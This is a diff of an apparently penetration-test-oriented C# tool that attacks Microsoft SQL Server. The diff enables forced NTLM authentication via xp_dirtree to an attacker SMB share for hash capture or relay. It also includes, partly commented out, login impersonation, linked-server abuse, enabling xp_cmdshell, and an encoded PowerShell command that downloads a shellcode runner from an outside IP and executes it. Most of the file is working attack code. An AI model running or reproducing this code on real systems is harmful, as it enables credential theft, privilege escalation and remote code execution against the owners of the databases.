@@ -41,22 +41,22 @@ namespace MSSQL
 
         public static void Main(string[] args)
         {
-            String serv = "dc01.corp2.com";
+            String serv = "sql05";
             String db = "master";
             String conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
             String res = "";
             SqlConnection con = new SqlConnection(conStr);
 
-            //try
-            //{
-            //    con.Open();
-            //    Console.WriteLine("[+] Authenticated to MSSQL Server!");
-            //}
-            //catch
-            //{
-            //    Console.WriteLine("[-] Authentication failed.");
-            //    Environment.Exit(0);
-            //}
+            try
+            {
+                con.Open();
+                Console.WriteLine("[+] Authenticated to MSSQL Server!");
+            }
+            catch
+            {
+                Console.WriteLine("[-] Authentication failed.");
+                Environment.Exit(0);
+            }
 
             //// Enumerate login info
             //String login = executeQuery("SELECT SYSTEM_USER;", con);
@@ -66,14 +66,17 @@ namespace MSSQL
             //getGroupMembership("public", con);
             //getGroupMembership("sysadmin", con);
 
-            //// Force NTLM authentication for hash-grabbing or relaying
-            //// Remember to disable SMB on kali
-            //String targetShare = "\\\\192.168.45.206\\vscode";
-            //res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
-            //Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");
+            // Force NTLM authentication for hash-grabbing or relaying
+            // Remember to disable SMB on kali
+            String targetShare = "\\\\192.168.45.173\\share";
+            res = executeQuery($"EXEC master..xp_dirtree \"{targetShare}\";", con);
+            Console.WriteLine($"[*] Forced authentication to '{targetShare}'.");
 
             //// Get logins that we can impersonate
             //res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
+            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
+            //// alternative (less filter)
+            //res = executeQuery("SELECT name, type_desc, default_database_name FROM master.sys.server_principals", con);
             //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
 
             //// Impersonate login and get login information
@@ -126,73 +129,73 @@ namespace MSSQL
             //res = executeQuery("EXEC cmdExec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA';", con);
             //Console.WriteLine($"[*] Executed command! Result: {res}");
 
-            // Enumerate linked servers
-            // Important: replace serv with the right SQL server you want to enumerate from
-            serv = "rdc01.corp1.com";
-            db = "master";
-            //conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
-            conStr = $"Server = localhost; Database = {db}; Integrated Security = True;";
-            res = "";
-            con = new SqlConnection(conStr);
-            try
-            {
-                con.Open();
-                Console.WriteLine("[+] Authenticated to MSSQL Server!");
-            }
-            catch
-            {
-                Console.WriteLine("[-] Authentication failed.");
-                Environment.Exit(0);
-            }
-            res = executeQuery("EXEC sp_linkedservers;", con);
-            Console.WriteLine($"[*] Found linked servers: {res}");
-            // select one of the linked servers from the previous output and put into linkedserv/linkedserv_escaped
-            //String linkedserv = "dc01.corp2.com";
-            String linkedserv = "sql53";
+            //// Enumerate linked servers
+            //// Important: replace serv with the right SQL server you want to enumerate from
+            //serv = "rdc01.corp1.com";
+            //db = "master";
+            ////conStr = $"Server = {serv}; Database = {db}; Integrated Security = True;";
+            //conStr = $"Server = localhost; Database = {db}; Integrated Security = True;";
+            //res = "";
+            //con = new SqlConnection(conStr);
+            //try
+            //{
+            //    con.Open();
+            //    Console.WriteLine("[+] Authenticated to MSSQL Server!");
+            //}
+            //catch
+            //{
+            //    Console.WriteLine("[-] Authentication failed.");
+            //    Environment.Exit(0);
+            //}
+            //res = executeQuery("EXEC sp_linkedservers;", con);
+            //Console.WriteLine($"[*] Found linked servers: {res}");
+            //// select one of the linked servers from the previous output and put into linkedserv/linkedserv_escaped
+            ////String linkedserv = "dc01.corp2.com";
+            //String linkedserv = "sql53";
 
-            // Get logins that we can impersonate
-            res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", con);
-            Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
-            // alternative (less filter)
-            res = executeQuery("SELECT name, type_desc, default_database_name FROM master.sys.server_principals", con);
-            Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
+            //// Get logins that we can impersonate
+            //res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", con);
+            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
+            //// alternative (less filter)
+            //res = executeQuery("SELECT name, type_desc, default_database_name FROM master.sys.server_principals", con);
+            //Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
 
 
-            // Impersonate login and get login information
-            String su = executeQuery("SELECT SYSTEM_USER;", con);
-            String un = executeQuery("SELECT USER_NAME();", con);
-            Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
-            //res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
-            res = executeQuery("EXECUTE AS LOGIN = 'webapp11';", con);
-            Console.WriteLine($"[*] Triggered impersonation.");
-            su = executeQuery("SELECT SYSTEM_USER;", con);
-            un = executeQuery("SELECT USER_NAME();", con);
-            Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
+            //// Impersonate login and get login information
+            //String su = executeQuery("SELECT SYSTEM_USER;", con);
+            //String un = executeQuery("SELECT USER_NAME();", con);
+            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
+            ////res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
+            //res = executeQuery("EXECUTE AS LOGIN = 'webapp11';", con);
+            //Console.WriteLine($"[*] Triggered impersonation.");
+            //su = executeQuery("SELECT SYSTEM_USER;", con);
+            //un = executeQuery("SELECT USER_NAME();", con);
+            //Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
 
             //// use if you get the error "Server 'SQL03' is not configured for RPC."
             //res = executeQuery("EXEC sp_serveroption 'SQL03', 'rpc out', 'on'; RECONFIGURE;", con);
 
-            // enumerate linked server
-            res = executeQuery($"EXEC ('select version;') AT \"{linkedserv}\";", con);
-            Console.WriteLine($"[*] Server Version: \n{res}");
+            //// enumerate linked server
+            //res = executeQuery($"EXEC ('select version;') AT \"{linkedserv}\";", con);
+            //Console.WriteLine($"[*] Server Version: \n{res}");
 
-            // Execute commands on linked server (eg OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1)
-            // [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166:8000/simple_shellcode_runner.ps1') | IEX"))
-            su = executeQuery("SELECT SYSTEM_USER;", con);
-            Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}'.");
-            su = executeQuery($"EXEC ('select SYSTEM_USER;') AT \"{linkedserv}\";", con);
-            Console.WriteLine($"[*] Current system user is '{su}' in database '{linkedserv}' via 1 link.");
-            res = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"{linkedserv}\";", con);
-            Console.WriteLine($"[*] Enabled advanced options on {linkedserv}.");
-            res = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"{linkedserv}\";", con);
-            Console.WriteLine($"[*] Enabled xp_cmdshell option on {linkedserv}.");
-            String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA2ADoAOAAwADAAMAAvAHMAaQBtAHAAbABlAF8AcwBoAGUAbABsAGMAbwBkAGUAXwByAHUAbgBuAGUAcgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=";
-            res = executeQuery($"EXEC ('xp_cmdshell ''{cmd}'';') AT \"{linkedserv}\";", con);
-            Console.WriteLine($"[*] Triggered command. Result: {res}");
+            //// Execute commands on linked server (eg OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1)
+            //// [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166:8000/simple_shellcode_runner.ps1') | IEX"))
+            //su = executeQuery("SELECT SYSTEM_USER;", con);
+            //Console.WriteLine($"[*] Current system user is '{su}' in database '{serv}'.");
+            //su = executeQuery($"EXEC ('select SYSTEM_USER;') AT \"{linkedserv}\";", con);
+            //Console.WriteLine($"[*] Current system user is '{su}' in database '{linkedserv}' via 1 link.");
+            //res = executeQuery($"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"{linkedserv}\";", con);
+            //Console.WriteLine($"[*] Enabled advanced options on {linkedserv}.");
+            //res = executeQuery($"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"{linkedserv}\";", con);
+            //Console.WriteLine($"[*] Enabled xp_cmdshell option on {linkedserv}.");
+            //String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANgA2ADoAOAAwADAAMAAvAHMAaQBtAHAAbABlAF8AcwBoAGUAbABsAGMAbwBkAGUAXwByAHUAbgBuAGUAcgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=";
+            //res = executeQuery($"EXEC ('xp_cmdshell ''{cmd}'';') AT \"{linkedserv}\";", con);
+            //Console.WriteLine($"[*] Triggered command. Result: {res}");
 
-            // enumerate linked server (openquery version)
-            res = executeQuery($"select version from openquery(\"{linkedserv}\", 'select @@version as version');", con);
-            Console.WriteLine($"[*] Server Version: \n{res}");
+            //// enumerate linked server (openquery version)
+            //res = executeQuery($"select version from openquery(\"{linkedserv}\", 'select @@version as version');", con);
+            //Console.WriteLine($"[*] Server Version: \n{res}");
 
             //// Execute on linked server via 'openquery' (eg OSEP-Code-Snippets/simple_shellcode_runner/simple_shellcode_runner.ps1)
             //// [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("(New-Object System.Net.WebClient).DownloadString('http://192.168.45.166:8000/simple_shellcode_runner.ps1') | IEX"))
